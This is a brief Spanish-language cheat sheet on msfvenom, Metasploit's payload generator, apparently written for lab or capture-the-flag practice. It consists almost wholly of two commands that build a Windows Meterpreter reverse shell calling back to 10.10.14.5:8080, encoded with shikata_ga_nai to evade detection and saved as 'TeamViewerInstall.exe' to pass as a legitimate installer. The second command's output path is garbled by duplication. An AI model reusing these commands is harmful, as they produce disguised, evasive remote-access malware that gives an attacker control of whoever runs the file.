# MSFVENOM
## Descripción
MSFVENOM es una herramienta que viene integrada en metasploit framework que sirve principalmente para crear payloads, podemos ver algunos ejemplos con enconders para darle algo mas de sabor.

### Encoder shikata_ga_nai sin interacciones
```python
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

### Encoder shikata_ga_nai con interacciones
```python
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe./TeamViewerInstall.exe
```

